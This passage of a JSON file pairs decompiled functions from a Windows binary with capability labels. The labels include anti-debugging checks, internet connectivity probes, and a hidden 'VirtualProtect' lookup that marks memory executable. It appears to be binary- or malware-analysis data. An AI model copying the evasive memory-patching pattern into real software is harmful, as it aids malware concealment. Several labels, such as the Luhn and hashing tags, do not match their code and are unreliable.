*var_ch_2 = 0x415433;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0041545f;\n        uStack36 = *0x4185e8 ^ &fcn.00415388::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00415388::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00408e69();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00415388::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 719
    },
    "0041644c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041644c(uint *param_1)\n\n{\n    *param_1 = 0x404238;\n    if (param_1[2] != 0) {\n        fcn.0040a8d5(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0041578f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041578f(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004075e8(0x416c10, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.00408e69();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040c87a();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.00416350(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00415855();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040c87a();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.0040762d();\n    return;\n}\n",
        "token_count": 567
    },
    "00415855": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00415855(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408e69();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00408e69();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00415b1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415b1d(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004155c6(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00408e69();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00408e69();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0041559f(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.004158b5(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "0040851d": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040851d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004075e8(0x416850, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00407d7d();\n        *puVar2 = 0;\n        puVar2 = fcn.00407d6a();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4358c4)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4358e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040d429(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00407d6a();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00407d7d();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00407dea(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004085ef(0x416850);\n                goto code_r0x004085e9;\n            }\n        }\n        puVar2 = fcn.00407d7d();\n        *puVar2 = 0;\n        puVar2 = fcn.00407d6a();\n        *puVar2 = 9;\n        fcn.004097f9(0, 0, 0, 0, 0);\n    }\ncode_r0x004085e9:\n    fcn.0040762d();\n    return;\n}\n",
        "token_count": 636
    },
    "0040b88a": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b88a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004075e8(0x416960, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00407d7d();\n        *puVar2 = 0;\n        puVar2 = fcn.00407d6a();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4358c4)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4358e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040d429(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00407d6a();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00407d7d();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040b815(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040b95c(0x416960);\n                goto code_r0x0040b956;\n            }\n        }\n        puVar2 = fcn.00407d7d();\n        *puVar2 = 0;\n        puVar2 = fcn.00407d6a();\n        *puVar2 = 9;\n        fcn.004097f9(0, 0, 0, 0, 0);\n    }\ncode_r0x0040b956:\n    fcn.0040762d();\n    return;\n}\n",
        "token_count": 640
    },
    "0040edbb": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0040edbb(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_ESI) {\n        if (*(unaff_EBP + -0x20) != unaff_ESI) {\n            puVar1 = *((*unaff_EDI >> 5) * 4 + 0x4358e0) + 4 + (*unaff_EDI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.0040d4c9(*unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "004156c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004156c0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x40421c;\n    fcn.0041644c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406203();\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0041646f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041646f(uint32_t arg_8h)\n\n{\n    fcn.0041644c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406203();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004164a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004164a0(uint32_t arg_8h)\n\n{\n    fcn.00416490();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406203();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "0040b285": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b285(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 92
    },
    "00404c0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404c0d(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 47
    },
    "00404c14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404c14(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "00404e4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404e4a(void)\n\n{\n    uint var_4h;\n    \n    *0x435630 = *0x435630 + 0x6218;\n    return;\n}\n",
        "token_count": 44
    },
    "00404e64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00404e64(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x435634 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40405c);\n    *0x434598 = 0x56;\n    *0x434599 = 0x69;\n    *0x43459a = 0x72;\n    *0x43459f = 0x50;\n    *0x4345a5 = 0x74;\n    *0x4345a6 = 0;\n    *0x43459b = 0x74;\n    *0x43459c = 0x75;\n    *0x43459d = 0x61;\n    *0x43459e = 0x6c;\n    *0x4345a0 = 0x72;\n    *0x4345a1 = 0x6f;\n    *0x4345a2 = 0x74;\n    *0x4345a3 = 0x65;\n    *0x4345a4 = 99;\n    *0x435628 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x435634, 0x434598);\n    var_4h = 0x40;\n    (**0x435628)(*0x435630, *0x435864, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 323
    },
    "00405a9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405a9f(void)\n\n{\n    int32_t in_EAX;\n    \n    if (7 < *(in_EAX + 0x18)) {\n        return *(in_EAX + 4);\n    }\n    return in_EAX + 4;\n}\n",
        "token_count": 62
    },
    "00406022": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00406022(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.004075e8(0x416768, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00407d6a();\n        *puVar1 = 0x16;\n        fcn.004097f9(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.0040870c();\n        fcn.00408824(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0040870c();\n        arg_8h_00 = fcn.00409973(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.0040870c();\n        uVar4 = fcn.00409ae9(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.0040870c();\n        fcn.00409a0f(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004060be();\n    }\n    fcn.0040762d();\n    return;\n}\n",
        "token_count": 460
    },
    "004060be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004060be(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040870c();\n    fcn.00408892(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 53
    },
    "004067b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004067b1(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040870c();\n    fcn.00408892(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 54
    },
    "00407aac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407aac(uint arg_8h)\n\n{\n    fcn.00407980(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "0040ad1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040afc2)\n\nfloat10 fcn.0040ad1e(double param_1)\n\n{\n    int32_t iVar1;\n    double dVar2;\n    double dVar3;\n    int32_t iVar4;\n    double dVar5;\n    double dVar6;\n    uchar auVar7 [16];\n    double dVar8;\n    double in_XMM7_Qa;\n    \n    dVar2 = in_XMM7_Qa & *0x401a30;\n    dVar3 = in_XMM7_Qa & *0x401a38;\n    if (*0x401b58 <= dVar2) {\n        return *0x401b68 + *((param_1._4_4_ >> 0x1f) * -8 + 0x401a40);\n    }\n    if (*0x401b48 <= dVar2) {\n        if (*0x401b40 <= dVar2) {\n            if (*0x401b38 <= dVar2) {\n                iVar1 = 0x300;\n                dVar3 = *0x401b20 / dVar2;\n            }\n            else {\n                iVar4 = (dVar2 + *0x401b30 >> 0x2c) - *0x401b10;\n                iVar1 = iVar4 * 3;\n                dVar3 = *(iVar4 * 0x18 + 0x401e30);\n                dVar3 = (dVar2 - dVar3) / (dVar2 * dVar3 + *0x401b28);\n            }\n            dVar5 = dVar3 * dVar3;\n            dVar6 = dVar5 * dVar5;\n            dVar8 = dVar3 * dVar3 * dVar3 * dVar3;\n            dVar5 = (((*0x401b00 * dVar6 + *0x401af0) * dVar6 + *0x401ae0) * dVar6 + *0x401ad0) * dVar5;\n            auVar7 = CONCAT88(((*0x401b08 * dVar8 + *0x401af8) * dVar8 + *0x401ae8) * dVar8 + *0x401ad8, dVar5);\n            auVar7 = shufpd(auVar7, auVar7, 1);\n            return *(iVar1 * 8 + 0x401e20) - (((dVar5 + SUB168(auVar7, 0)) * dVar3 - *(iVar1 * 8 + 0x401e28)) - dVar3) |\n                   in_XMM7_Qa ^ dVar2;\n        }\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((((((*0x401ac0 * dVar5 + *0x401ab0) * dVar5 + *0x401aa0) * dVar5 + *0x401a90) * dVar5 + *0x401a80) *\n                   dVar5 + *0x401a70) * dVar5 + *0x401a60) * dVar5 + *0x401a50) * dVar2;\n        auVar7 = CONCAT88(((((((*0x401ac8 * dVar3 + *0x401ab8) * dVar3 + *0x401aa8) * dVar3 + *0x401a98) * dVar3 +\n                            *0x401a88) * dVar3 + *0x401a78) * dVar3 + *0x401a68) * dVar3 + *0x401a58, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (*0x401b50 <= dVar2) {\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((*0x401b00 * dVar5 + *0x401af0) * dVar5 + *0x401ae0) * dVar5 + *0x401ad0) * dVar2;\n        auVar7 = CONCAT88(((*0x401b08 * dVar3 + *0x401af8) * dVar3 + *0x401ae8) * dVar3 + *0x401ad8, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (dVar2 != *0x401b18) {\n        if (*0x401b60 <= dVar2) {\n            return *0x401b68 * *0x401b68 + param_1;\n        }\n        return *0x401b68 * *0x401b68 + param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 1206
    },
    "0040c1ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040c200)\n// WARNING: Removing unreachable block (ram,0x0040c206)\n// WARNING: Removing unreachable block (ram,0x0040c208)\n\nvoid fcn.0040c1ec(void)\n\n{\n    return;\n}\n",
        "token_count": 65
    },
    "0040ed1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ed1d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004075e8(0x416b48, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.00407d6a();\n        *puVar1 = 0x16;\n        fcn.004097f9(0, 0, 0, 0, 0);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0040e5fe(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040edbb();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.0040762d();\n    return;\n}\n",
        "token_count": 458
    },
    "0040ede9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ede9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0040ed1d(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 79
    },
    "0041266d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041266d(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.00407d6a();\n        *puVar1 = 0x16;\n        fcn.004097f9(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x434590;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "0041115e": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041115e(void)\n\n{\n    *0x418e2c = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x403678, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00416599": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416599(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004075e8(0x416d68, 0xc);\n    fcn.00406af0(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x435874;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x435870;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004165dd;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040a8d5(arg_8h_00);\ncode_r0x004165dd:\n        fcn.0040a8d5(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00416600();\n    fcn.0040762d();\n    return;\n}\n",
        "token_count": 395
    }
}